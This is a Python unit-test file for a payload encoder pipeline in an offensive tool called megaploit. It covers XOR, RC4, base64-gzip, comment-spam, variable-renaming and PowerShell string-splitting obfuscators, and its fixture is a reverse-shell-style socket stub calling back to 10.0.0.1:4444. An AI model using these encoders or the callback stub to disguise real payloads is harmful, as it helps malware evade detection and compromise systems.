"""
Unit tests for megaploit.payload.encoders — encoder pipeline.
"""
from __future__ import annotations

import base64
import gzip
import zlib

import pytest

from megaploit.payload.encoders import (
    ENCODERS,
    EncoderError,
    encode_pipeline,
    encoder_info,
)


SAMPLE_PY = b"""
import socket
LHOST = "10.0.0.1"
PORT  = 4444
def main():
    s = socket.socket()
    s.connect((LHOST, PORT))
    while True:
        cmd = s.recv(1024).decode()
        if cmd == "exit":
            break
main()
"""

SAMPLE_TEXT = b"Hello World! This is a test payload string."


class TestEncoderInfo:
    def test_all_encoders_have_docs(self):
        info = encoder_info()
        assert len(info) == len(ENCODERS)
        for name, doc in info.items():
            assert name in ENCODERS
            assert len(doc) > 0


class TestXorRolling:
    def test_output_different_from_input(self):
        out = ENCODERS["xor_rolling"](SAMPLE_TEXT)
        assert out != SAMPLE_TEXT

    def test_output_changes_each_call(self):
        """Key is random, so two calls should (almost certainly) differ."""
        out1 = ENCODERS["xor_rolling"](SAMPLE_TEXT)
        out2 = ENCODERS["xor_rolling"](SAMPLE_TEXT)
        # With overwhelming probability these differ due to random key
        # We can't guarantee equality failure but can check structure
        assert len(out1) == len(SAMPLE_TEXT) + 4 + 32

    def test_length_correct(self):
        """Output length = 4 (length prefix) + 32 (key) + len(data)."""
        data = b"A" * 100
        out = ENCODERS["xor_rolling"](data)
        assert len(out) == 4 + 32 + 100


class TestRC4:
    def test_output_different(self):
        out = ENCODERS["rc4"](SAMPLE_TEXT)
        assert out != SAMPLE_TEXT

    def test_output_length(self):
        """Output = 16 (key) + len(data)."""
        data = b"X" * 50
        out = ENCODERS["rc4"](data)
        assert len(out) == 16 + 50


class TestB64Gzip:
    def test_output_is_base64(self):
        out = ENCODERS["b64gzip"](SAMPLE_TEXT)
        # Should be decodeable as base64
        decoded = base64.b64decode(out)
        assert gzip.decompress(decoded) == SAMPLE_TEXT

    def test_round_trip(self):
        original = b"test data 12345"
        encoded  = ENCODERS["b64gzip"](original)
        decoded  = gzip.decompress(base64.b64decode(encoded))
        assert decoded == original


class TestRev:
    def test_reverses_bytes(self):
        data = b"ABCD"
        assert ENCODERS["rev"](data) == b"DCBA"

    def test_double_rev_is_identity(self):
        assert ENCODERS["rev"](ENCODERS["rev"](SAMPLE_TEXT)) == SAMPLE_TEXT


class TestZlibB64:
    def test_round_trip(self):
        original = b"zlib test data"
        encoded  = ENCODERS["zlib_b64"](original)
        decoded  = zlib.decompress(base64.b64decode(encoded))
        assert decoded == original


class TestRot13Src:
    def test_all_ascii_letters_shifted(self):
        data = b"Hello World"
        out  = ENCODERS["rot13_src"](data)
        # Decode with ROT-13 again should give back original
        back = ENCODERS["rot13_src"](out)
        assert back == data

    def test_non_alpha_unchanged(self):
        data = b"123 !@#"
        assert ENCODERS["rot13_src"](data) == data


class TestNullPad:
    def test_doubles_length(self):
        data = b"ABCD"
        out  = ENCODERS["null_pad"](data)
        assert len(out) == len(data) * 2

    def test_alternating_nulls(self):
        data = b"\xAA\xBB"
        out  = ENCODERS["null_pad"](data)
        assert out[0] == 0xAA
        assert out[1] == 0x00
        assert out[2] == 0xBB
        assert out[3] == 0x00


class TestCommentSpam:
    def test_output_is_valid_text(self):
        src = b"x = 1\ny = 2\nz = x + y\n"
        out = ENCODERS["comment_spam"](src)
        # Should be decodeable as UTF-8
        text = out.decode("utf-8")
        assert "x = 1" in text
        assert "y = 2" in text

    def test_binary_passthrough(self):
        """Binary data should pass through unchanged."""
        data = bytes(range(256))
        out = ENCODERS["comment_spam"](data)
        assert out == data

    def test_comments_added(self):
        """With enough lines, at least one comment should be inserted."""
        lines = "\n".join([f"var_{i} = {i}" for i in range(50)])
        out = ENCODERS["comment_spam"](lines.encode()).decode()
        assert "#" in out


class TestVarnameRand:
    def test_output_is_valid_text(self):
        out = ENCODERS["varname_rand"](SAMPLE_PY)
        text = out.decode("utf-8")
        # Basic structure should be preserved
        assert "import socket" in text

    def test_binary_passthrough(self):
        data = bytes(range(256))
        out = ENCODERS["varname_rand"](data)
        assert out == data


class TestPs1Concat:
    def test_splits_long_strings(self):
        ps1 = b'$cmd = "pythonw.exe"\n$path = "C:\\Windows\\System32"'
        out = ENCODERS["ps1_concat"](ps1).decode()
        # Long strings should be split into concat form
        assert "+" in out

    def test_short_strings_unchanged(self):
        ps1 = b'$x = "hi"\n'
        out = ENCODERS["ps1_concat"](ps1).decode()
        # "hi" is only 2 chars — shorter than the 4-char threshold
        assert '"hi"' in out

    def test_binary_passthrough(self):
        data = bytes(range(256))
        out = ENCODERS["ps1_concat"](data)
        assert out == data


class TestEncodePipeline:
    def test_empty_pipeline_is_identity(self):
        assert encode_pipeline(SAMPLE_TEXT, []) == SAMPLE_TEXT

    def test_single_encoder(self):
        result = encode_pipeline(SAMPLE_TEXT, ["rev"])
        assert result == SAMPLE_TEXT[::-1]

    def test_chained_encoders(self):
        result = encode_pipeline(b"ABCD", ["rev", "rev"])
        assert result == b"ABCD"  # rev of rev is identity

    def test_unknown_encoder_raises(self):
        with pytest.raises(EncoderError, match="Unknown encoder"):
            encode_pipeline(b"data", ["nonexistent"])

    def test_pipeline_order(self):
        """b64gzip applied then rev should differ from rev then b64gzip."""
        data = b"test data"
        a = encode_pipeline(data, ["b64gzip", "rev"])
        b = encode_pipeline(data, ["rev", "b64gzip"])
        assert a != b

    def test_all_encoders_accept_bytes(self):
        """Every encoder must accept bytes without raising on non-empty input."""
        for name, fn in ENCODERS.items():
            result = fn(b"test payload 12345")
            assert isinstance(result, bytes), f"Encoder {name} did not return bytes"
